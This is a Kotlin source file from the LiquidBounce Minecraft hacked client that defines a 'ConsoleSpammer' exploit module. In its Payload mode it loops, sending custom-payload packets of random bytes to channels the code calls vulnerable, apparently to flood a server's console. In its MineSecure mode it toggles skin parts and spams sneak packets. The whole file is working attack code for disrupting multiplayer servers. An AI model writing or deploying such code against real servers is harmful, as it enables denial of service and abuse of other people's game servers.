/*
 * LiquidBounce Hacked Client
 * A free open source mixin-based injection hacked client for Minecraft using Minecraft Forge.
 * https://github.com/CCBlueX/LiquidBounce/
 */
package net.ccbluex.liquidbounce.features.module.modules.exploit

import io.netty.buffer.Unpooled
import kotlinx.coroutines.delay
import net.ccbluex.liquidbounce.event.WorldEvent
import net.ccbluex.liquidbounce.event.async.loopSequence
import net.ccbluex.liquidbounce.event.handler
import net.ccbluex.liquidbounce.features.module.Category
import net.ccbluex.liquidbounce.features.module.Module
import net.ccbluex.liquidbounce.utils.client.PacketUtils.sendPacket
import net.ccbluex.liquidbounce.utils.client.PacketUtils.sendPackets
import net.ccbluex.liquidbounce.utils.kotlin.RandomUtils.nextInt
import net.minecraft.entity.player.EnumPlayerModelParts
import net.minecraft.network.PacketBuffer
import net.minecraft.network.play.client.C0BPacketEntityAction
import net.minecraft.network.play.client.C0BPacketEntityAction.Action.START_SNEAKING
import net.minecraft.network.play.client.C0BPacketEntityAction.Action.STOP_SNEAKING
import net.minecraft.network.play.client.C17PacketCustomPayload
import kotlin.random.Random.Default.nextBoolean
import kotlin.random.Random.Default.nextBytes

object ConsoleSpammer : Module("ConsoleSpammer", Category.EXPLOIT, subjective = true) {

    private val mode by choices("Mode", arrayOf("Payload", "MineSecure"), "Payload")
    private val delay by int("Delay", 0, 0..500)

    private val payload = PacketBuffer(Unpooled.buffer())
    private val vulnerableChannels = arrayOf("MC|BEdit", "MC|BSign", "MC|TrSel", "MC|PickItem")

    init {
        val rawPayload = ByteArray(nextInt(endExclusive = 128))
        nextBytes(rawPayload)
        payload.writeBytes(rawPayload)
    }

    val onUpdate = loopSequence {
        when (mode.lowercase()) {
            "payload" -> sendPacket(C17PacketCustomPayload(vulnerableChannels.random(), payload))
            "minesecure" -> {
                mc.gameSettings.setModelPartEnabled(EnumPlayerModelParts.HAT, nextBoolean())
                mc.gameSettings.setModelPartEnabled(EnumPlayerModelParts.JACKET, nextBoolean())
                mc.gameSettings.setModelPartEnabled(EnumPlayerModelParts.LEFT_PANTS_LEG, nextBoolean())
                mc.gameSettings.setModelPartEnabled(EnumPlayerModelParts.RIGHT_PANTS_LEG, nextBoolean())
                mc.gameSettings.setModelPartEnabled(EnumPlayerModelParts.LEFT_SLEEVE, nextBoolean())
                mc.gameSettings.setModelPartEnabled(EnumPlayerModelParts.RIGHT_SLEEVE, nextBoolean())

                repeat(5) {
                    sendPackets(
                        C0BPacketEntityAction(mc.thePlayer, STOP_SNEAKING),
                        C0BPacketEntityAction(mc.thePlayer, START_SNEAKING)
                    )
                }
            }
        }

        delay(delay.toLong())
    }

    val onWorld = handler<WorldEvent> { event ->
        if (event.worldClient == null) {
            state = false
        }
    }

}